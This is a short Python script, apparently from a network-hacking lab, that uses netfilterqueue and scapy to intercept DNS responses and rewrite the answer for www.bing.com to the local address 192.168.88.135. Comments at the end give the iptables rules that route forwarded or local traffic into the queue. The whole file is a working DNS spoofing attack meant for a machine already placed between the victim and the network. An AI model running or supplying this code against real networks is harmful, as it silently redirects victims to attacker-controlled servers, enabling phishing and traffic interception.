#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com".encode() in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.135")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# When running make sure you forward the packets using:
# --- When using non-local testing ---
# iptables -I FORWARD -j NFQUEUE --queue-num (set queue num usually 0)
# --- When using LOCAL testing ---
# iptables -I OUTPUT -j NFQUEUE --queue-num (set queue num usually 0)
# iptables -I INPUT -j NFQUEUE --queue-num (set queue num usually 0)
# --- When finished ---
# iptables --flush (to clear queue)
